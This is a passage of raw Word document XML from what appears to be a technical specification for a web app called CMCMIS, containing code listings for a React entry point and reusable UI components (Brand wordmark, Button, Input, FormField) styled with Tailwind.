            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import './styles/globals.css';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { App } from './App.jsx';</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const rootElement = document.getElementById('root');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (!rootElement) throw new Error('#root element not found');</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ReactDOM.createRoot(rootElement).render(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;React.StrictMode&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;App /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;/React.StrictMode&gt;,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>7.8  Brand.jsx — Reusable Wordmark</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>CMCMIS in ink color + a small accent-color dot. Three sizes for use above the Login card, in the Sidebar header, and inline elsewhere.</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src/components/Brand.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import clsx from 'clsx';</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const SIZE_STYLES = {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  sm: 'text-base tracking-tight',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  md: 'text-xl tracking-tight',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  lg: 'text-3xl tracking-tight',</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t xml:space="preserve"> * @param {{ size?: 'sm'|'md'|'lg', className?: string }} props</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export function Brand({ size = 'md', className }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;span className={clsx('font-semibold text-ink select-none',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                          SIZE_STYLES[size], className)}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          aria-label="CMCMIS"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      CMCMIS</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;span className="text-accent ml-0.5" aria-hidden="true"&gt;·&lt;/span&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/span&gt;</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w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>7.9  UI Primitives — Button, Input, FormField, Badge, Spinner</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Five tiny, composable building blocks. Together they cover ~95% of the form / button / label / chip / loading-indicator needs of the entire app.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>7.9.1  Button.jsx</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src/components/ui/Button.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import clsx from 'clsx';</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const SHARED =</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  'inline-flex items-center justify-center gap-2 rounded-md font-medium ' +</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  'transition-colors focus:outline-none focus-visible:ring-2 ' +</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  'focus-visible:ring-accent focus-visible:ring-offset-2 ' +</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  'focus-visible:ring-offset-base disabled:opacity-50 disabled:cursor-not-allowed';</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const VARIANTS = {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  primary:   'bg-accent text-white hover:bg-accent-hover active:bg-accent-hover/90',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  secondary: 'bg-base-elev text-ink border border-border hover:bg-base active:bg-base/80',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  ghost:     'bg-transparent text-ink hover:bg-base-elev active:bg-base-elev/80',</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t>const SIZES = { sm: 'px-2.5 py-1.5 text-xs', md: 'px-4 py-2 text-sm' };</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export function Button({ variant='primary', size='md', type='button',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                         className, children, ...rest }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;button type={type}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            className={clsx(SHARED, VARIANTS[variant], SIZES[size], className)}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            {...rest}&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      {children}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/button&gt;</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w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>7.9.2  Input.jsx — forwardRef for react-hook-form</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src/components/ui/Input.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { forwardRef } from 'react';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import clsx from 'clsx';</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const BASE =</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  'block w-full rounded-md border bg-white text-ink placeholder:text-ink-soft/60 ' +</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  'shadow-card transition-colors disabled:opacity-50 disabled:cursor-not-allowed';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const SIZES = { sm: 'px-2.5 py-1.5 text-xs', md: 'px-3 py-2 text-sm' };</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export const Input = forwardRef(function Input(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  { size='md', invalid=false, className, ...rest }, ref) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;input ref={ref}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">           aria-invalid={invalid || undefined}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">           className={clsx(BASE, SIZES[size],</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">             invalid ? 'border-danger focus:border-danger focus:ring-danger'</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                     : 'border-border focus:border-accent focus:ring-accent',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">             'focus:outline-none focus:ring-1', className)}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">           {...rest} /&gt;</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w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>7.9.3  FormField.jsx — label + control + helper/error</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src/components/ui/FormField.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { useId, Children, cloneElement, isValidElement } from 'react';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import clsx from 'clsx';</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export function FormField({ label, children, helper, error, htmlFor, className }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const autoId  = useId();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const inputId = htmlFor || autoId;</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return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;div className={clsx('space-y-1', className)}&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;label htmlFor={inputId} className="block text-sm font-medium text-ink"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        {label}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;/label&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      {wireChild(children, inputId, Boolean(error))}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      {error</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        ? &lt;p className="text-xs text-danger" role="alert"&gt;{error}&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        : helper</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          ? &lt;p className="text-xs text-ink-soft"&gt;{helper}&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          : null}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/div&gt;</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function wireChild(children, id, invalid) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!isValidElement(children)) return children;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
